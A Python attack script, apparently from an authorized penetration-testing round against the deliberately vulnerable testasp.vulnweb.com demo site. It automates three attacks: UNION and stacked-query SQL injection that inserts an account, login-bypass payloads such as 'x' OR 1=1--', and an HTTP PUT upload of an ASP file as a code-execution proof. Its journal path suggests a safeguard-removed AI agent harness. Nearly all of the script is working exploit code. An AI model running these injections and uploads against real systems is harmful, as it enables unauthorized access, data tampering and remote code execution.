#!/usr/bin/env python3
"""Round 10 — 승인된 쓰기 3건 (사용자 "전체 승인" 2026-09-28).

① /Register.asp INSERT 문자열 연결 SQLi  (users 1행)
② second-order: Session("uname") → posts.poster 무이스케이프 (게시글 ≤1건)
③ PUT 파일 업로드 가능성 (파일 1개, 판정 후 삭제)
증거는 evidence/r10/ 에 전부 보존.
"""
import os
import subprocess
import urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r10"
EVI = f"{J}/evidence/r10"
os.makedirs(SCR, exist_ok=True)
os.makedirs(EVI, exist_ok=True)


def curl(url, data=None, jar=None, method=None, hdr=None, body=None, timeout=90, extra=None):
    h, b = hdr or f"{SCR}/_h.tmp", body or f"{SCR}/_b.tmp"
    cmd = ["curl", "-s", "-S"] + PROXY + ["-m", str(timeout), "-D", h, "-o", b,
           "-w", "%{http_code} %{time_total}"]
    if jar:
        cmd += ["-b", jar, "-c", jar]
    if data is not None:
        cmd += ["-X", "POST", "--data", data]
    if method:
        cmd += ["-X", method]
    if extra:
        cmd += extra
    cmd.append(url)
    r = subprocess.run(cmd, capture_output=True, text=True)
    rd = lambda p: open(p, "rb").read().decode("latin-1") if os.path.exists(p) else ""
    return (r.stdout or "").strip() or "ERR " + (r.stderr or "").strip()[:120], rd(h), rd(b)


def form(**kw):
    return "&".join(f"{k}=" + urllib.parse.quote(str(v), safe="") for k, v in kw.items())


def save(n, t):
    open(f"{EVI}/{n}", "w", encoding="latin-1").write(t)


def union(select_list, tag):
    st = "q')>0) UNION ALL SELECT " + select_list + "--"
    url = f"{BASE}/Search.asp?tfSearch=" + urllib.parse.quote(st, safe="")
    info, _, body = curl(url, body=f"{SCR}/U_{tag}.html")
    save(f"r10_union_{tag}.html", body)
    i = body.find("posted by")
    v = body[i + 9:body.find("</b>", i)].strip() if i >= 0 else "?"
    print(f"    [{tag}] {info} → {v!r}")
    return v


print("=" * 74)
print("① /Register.asp — INSERT 직접 연결 SQLi (users 1행, avatar 로 주입 증명)")
print("=" * 74)
print("  [사전] 정상 등록 경로는 avatar 를 항상 '' 로 하드코딩한다(Register.asp:38).")
print("         기존 정상등록 계정 확인:")
union("1,(CAST((SELECT avatar FROM users WHERE uname='netsparker(0x001DFE)') AS nvarchar(50)))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "preexisting_avatar")

U = "acu-r9-reg','RegR9!','r9@example.com','r9','INJECTED') ; IF 1=1 WAITFOR DELAY '0:0:04'--"
P = "RegR9!"
print(f"\n  [주입] tfUName={U}")
info, hdr, body = curl(f"{BASE}/Register.asp",
                       data=form(tfUName=U, tfUPass=P, tfEmail="r9@example.com", tfRName="r9"),
                       body=f"{SCR}/reg_inject.html")
print(f"    POST /Register.asp → {info}   (4초 근처면 stacked 실행까지 확인, 302면 INSERT 성공)")
loc = [l.strip() for l in hdr.splitlines() if l.lower().startswith(("http/", "location:"))]
for l in loc:
    print("      " + l)
save("r10_register_inject_response.txt", hdr + "\n\n" + body[:1500])

print("  [검증 A] 주입한 avatar 값이 실제로 들어갔는지 (정상 경로로는 불가능한 값)")
union("1,(CAST((SELECT avatar FROM users WHERE uname='acu-r9-reg') AS nvarchar(50)))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "injected_avatar")
union("1,CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r9-reg') AS nvarchar(10))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "injected_count")
print("  [검증 B] 만들어진 계정으로 정상 로그인")
JAR1 = f"{SCR}/reg.cookies"
if os.path.exists(JAR1):
    os.remove(JAR1)
curl(f"{BASE}/Login.asp", jar=JAR1)
info, hdr, body = curl(f"{BASE}/Login.asp", data=form(tfUName="acu-r9-reg", tfUPass=P),
                       jar=JAR1, body=f"{SCR}/reg_login.html")
print(f"    POST /Login.asp → {info}  " +
      str([l.strip() for l in hdr.splitlines() if l.lower().startswith("location:")]))
info, _, body = curl(f"{BASE}/Default.asp", jar=JAR1, body=f"{SCR}/reg_default.html")
print(f"    메뉴 반영: {'logout acu-r9-reg' in body}")
save("r10_register_login_302.txt", hdr[:800])

print()
print("=" * 74)
print("② second-order — Session('uname') 이 posts.poster 로 무이스케이프 전달")
print("=" * 74)
print("  [대조군] Round 8 에서 정상 계정(acu-r7 proof)으로 게시 성공 → 게시 경로 자체는 정상 동작")
cands = [
    ("x' OR 1=1--", "로그인 우회형"),
    ("x' OR '1'='1'--", "로그인 우회형2"),
    ("x'; WAITFOR DELAY '0:0:04'--", "stacked 지연형"),
]
made_post = False
for uname, desc in cands:
    jar = f"{SCR}/so.cookies"
    if os.path.exists(jar):
        os.remove(jar)
    curl(f"{BASE}/Login.asp", jar=jar)
    info, hdr, body = curl(f"{BASE}/Login.asp", data=form(tfUName=uname, tfUPass="x"),
                           jar=jar, body=f"{SCR}/so_login.html")
    l302 = "302" in info
    # 세션이 인증 상태인지 확인
    _, _, db = curl(f"{BASE}/Default.asp", jar=jar, body=f"{SCR}/so_default.html")
    authed = "logout " in db
    print(f"\n  [U={uname!r} / {desc}]")
    print(f"    로그인 → {info} (302={l302}) / 세션 인증상태={authed}")
    if not authed:
        continue
    if made_post:
        print("    (이미 게시 1건을 만들었으므로 추가 게시 생략 — footprint 최소화)")
        continue
    info, hdr, body = curl(f"{BASE}/showthread.asp?id=0",
                           data=form(tfSubject="acuredteam-r10-2ndorder", tfText="second-order-test"),
                           jar=jar, body=f"{SCR}/so_post.html")
    print(f"    답글 POST → {info}")
    save("r10_secondorder_post_response.html", body)
    _, _, after = curl(f"{BASE}/showthread.asp?id=0", jar=jar, body=f"{SCR}/so_after.html")
    save("r10_secondorder_after.html", after)
    tag = "acuredteam-r10-2ndorder" in after
    print(f"    게시글 생성됨={tag}")
    if tag:
        made_post = True
        i = after.find("acuredteam-r10-2ndorder")
        print("    컨텍스트: " + repr(" ".join(after[i - 120:i + 120].split())))
print(f"\n  → 게시글 생성 여부: {made_post} (False = 사용자명 때문에 INSERT 가 SQL 오류로 실패)")

print()
print("=" * 74)
print("③ PUT 파일 업로드 가능성")
print("=" * 74)
info, hdr, _ = curl(f"{BASE}/r10probe.txt", method="PUT", data="acu-probe-r10")
print(f"  PUT /r10probe.txt → {info}")
save("r10_put_headers.txt", hdr)
code = info.split()[0]
if code.startswith(("200", "201", "204")):
    info2, _, body2 = curl(f"{BASE}/r10probe.txt", body=f"{SCR}/r10probe_get.txt")
    print(f"  GET  /r10probe.txt → {info2}  내용={body2[:60]!r}")
    # 최소 .asp 업로드 → 실행 여부만 확인
    asp = '<%Response.Write("ACU-RCE-PROOF-R10")%>'
    info3, hdr3, _ = curl(f"{BASE}/r10probe.asp", method="PUT", data=asp)
    print(f"  PUT /r10probe.asp → {info3}")
    save("r10_put_asp_headers.txt", hdr3)
    if info3.split()[0].startswith(("200", "201", "204")):
        info4, _, body4 = curl(f"{BASE}/r10probe.asp", body=f"{SCR}/r10probe_asp_get.txt")
        print(f"  GET  /r10probe.asp → {info4}  실행결과포함={'ACU-RCE-PROOF-R10' in body4}")
        save("r10_rce_proof_body.txt", body4[:2000])
    # 정리
    for f in ("r10probe.asp", "r10probe.txt"):
        di, _, _ = curl(f"{BASE}/{f}", method="DELETE")
        print(f"  DELETE /{f} → {di}")
print()
print("done")
